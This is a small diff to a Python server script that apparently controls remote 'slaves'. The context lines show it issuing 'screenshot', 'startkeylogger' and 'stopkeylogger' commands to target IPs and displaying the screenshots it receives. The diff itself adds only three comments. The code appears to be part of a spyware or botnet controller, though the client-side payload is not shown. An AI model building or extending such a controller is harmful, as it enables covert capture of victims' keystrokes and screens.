@@ -38,6 +38,7 @@ def runServer(sharedArray, slaves):
                 data = sres.recv(1024)
                 command = bytearray(sharedArray)
                 decoded = command.decode('utf-8').split(" ")
+                #checks if current ip is target ip
                 if ((decoded[0] == "screenshot" or 
                     decoded[0] == "startkeylogger" or
                     decoded[0] == "stopkeylogger") 
@@ -48,6 +49,7 @@ def runServer(sharedArray, slaves):
                     sharedArray[:] = " ".encode("utf-8")
                 if(decoded[0] == "screenshot" ):
                     if decoded[1] == addr[0]:
+                        #receive image data and open image
                         receiveImage(sres)
                         img = Image.open("screenshot.png")
                         img.show()
@@ -137,4 +139,5 @@ help: shows this message
                   ''')
         else:
             print("Unvalid command")
+    #terminate server process
     p.terminate()
